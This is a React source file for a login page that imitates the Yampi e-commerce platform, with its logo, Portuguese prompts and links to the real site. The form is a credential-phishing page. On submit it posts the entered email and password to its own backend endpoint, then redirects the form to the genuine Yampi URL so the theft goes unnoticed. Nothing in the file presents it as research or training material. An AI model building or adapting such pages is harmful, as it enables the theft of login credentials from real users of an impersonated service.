import { useState, useRef } from 'react';
import './App.css';
import brand from './assets/brand-yampi.svg';
import { api } from './services/api';

function App() {
	const [emailUser, setEmailUser] = useState('');
	const [passwordUser, setPasswordUser] = useState('');
	const [isFormSubmitted, setIsFormSubmitted] = useState(false);
	const [errors, setErrors] = useState({});

	const passwordRef = useRef(null); // Referência para o elemento de senha

	async function onSubmitUser(event) {
		event.preventDefault();
		setIsFormSubmitted(true);

		if (!emailUser || !passwordUser) {
			setErrors({
				email: !emailUser,
				password: !passwordUser
			});
			return;
		}

		const saveData = {
			email: emailUser,
			password: passwordUser
		};

		await saveUser(saveData);
		afterSave(event);
	}

	function handleEmailLogin(event) {
		setEmailUser(event.currentTarget.value);
	}

	function handlePasswordLogin(event) {
		setPasswordUser(event.currentTarget.value);
	}

	async function saveUser(saveData) {
		try {
			const response = await api.post('/user', saveData);
			if (response.status == 201) {
				setTimeout(() => { }, 2000);
			}
			return response.data;
		} catch (error) {
			console.error(error);
		}
	}

	function afterSave(event) {
		event.target.action = 'https://app.yampi.com.br/';
		event.target.submit();
	}

	return (
		<div className='auth-box'>
			<div className='inner-authbox'>
				<div className='title-container'>
					<img className='logo-yampi' src={brand} alt='brand-yampi' />
					<h1 className='title-f20'>Identifique-se</h1>
					<p className='text-f15'>Digite seu e-mail e senha</p>
				</div>
				<form className='form-container' onSubmit={onSubmitUser}>
					<div className={`form-group ${errors.email && isFormSubmitted ? 'error-visible' : ''}`}>
						<label htmlFor='form-stacked-text' className='label-block'>
							E-mail
						</label>
						<input
							type='email'
							name='email'
							placeholder='john@yampi.com.br'
							className={`input-block ${errors.email && isFormSubmitted ? 'invalid' : ''}`}
							onChange={handleEmailLogin}
							tabIndex={1} // Definindo o tabIndex como 1
						/>
						{errors.email && isFormSubmitted && (
							<div className='error-message'>Campo obrigatório</div>
						)}
					</div>
					<div className={`form-group ${errors.password && isFormSubmitted ? 'error-visible' : ''}`}>
						<label htmlFor='form-stacked-text' className='label-block'>
							<span>Senha</span>
							<a href='https://app.yampi.com.br/'>Esqueci minha senha</a>
						</label>
						<input
							type='password'
							name='password'
							placeholder='Digite sua senha'
							className={`input-block ${errors.password && isFormSubmitted ? 'invalid' : ''}`}
							onChange={handlePasswordLogin}
							tabIndex={2} // Definindo o tabIndex como 2
							ref={passwordRef} // Associando a referência ao elemento de senha
						/>
						{errors.password && isFormSubmitted && (
							<div className='error-message'>Campo obrigatório</div>
						)}
					</div>
					<button type='submit' className='button-submit' tabIndex={3}> {/* Definindo o tabIndex como 3 */}
						Entrar
					</button>
					<div className='last-text-container'>
						<span className='last-text'>
							Primeira vez na Yampi? <a href='https://app.yampi.com.br/onboarding/'>Criar conta</a>
						</span>
					</div>
				</form>
			</div>
		</div>
	);
}

export default App;
